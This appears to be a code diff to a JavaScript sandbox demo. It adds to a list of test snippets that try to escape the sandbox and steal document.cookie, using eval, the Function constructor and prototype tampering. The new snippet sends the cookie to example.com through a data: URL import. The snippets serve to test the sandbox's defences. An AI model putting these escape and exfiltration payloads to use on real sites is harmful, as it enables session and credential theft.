@@ -6342,7 +6342,7 @@ var $;
             return "";
         }
         snippet_codes() {
-            return ["return document.cookie", "let evil = eval\nreturn evil( 'document.cookie' )", "let Function = ( function*(){} ).constructor\nlet getCookie = Function( 'return document.cookie' )\nreturn getCookie().next().value", "let Function = sin.constructor\nlet getCookie = Function( 'return document.cookie' )\nreturn getCookie()", "let NumberProto = (0n).__proto__\nNumberProto.toString = null", "sin.call = ()=> 0\nreturn sin.call"];
+            return ["return document.cookie", "let evil = eval\nreturn evil( 'document.cookie' )", "let Function = ( function*(){} ).constructor\nlet getCookie = Function( 'return document.cookie' )\nreturn getCookie().next().value", "let Function = sin.constructor\nlet getCookie = Function( 'return document.cookie' )\nreturn getCookie()", "let NumberProto = (0n).__proto__\nNumberProto.toString = null", "sin.call = ()=> 0\nreturn sin.call", "let script = 'location = \"https://example.com/\" + document.cookie'\nreturn import(`data:text/javascript;charset=utf-8,${script}`)"];
         }
     }
     __decorate([
@@ -6589,8 +6589,10 @@ var $;
                 if (!this.script_to_execute())
                     return '';
                 $.$mol_dom_context.document.cookie = 'password=P@zzW0rd';
-                const func = this.func();
-                return String(func());
+                const async_func = this.func();
+                const sync_func = $.$mol_fiber_sync(async () => async_func());
+                const res = sync_func();
+                return String(res);
             }
             run() {
                 this.script_to_execute(this.script());
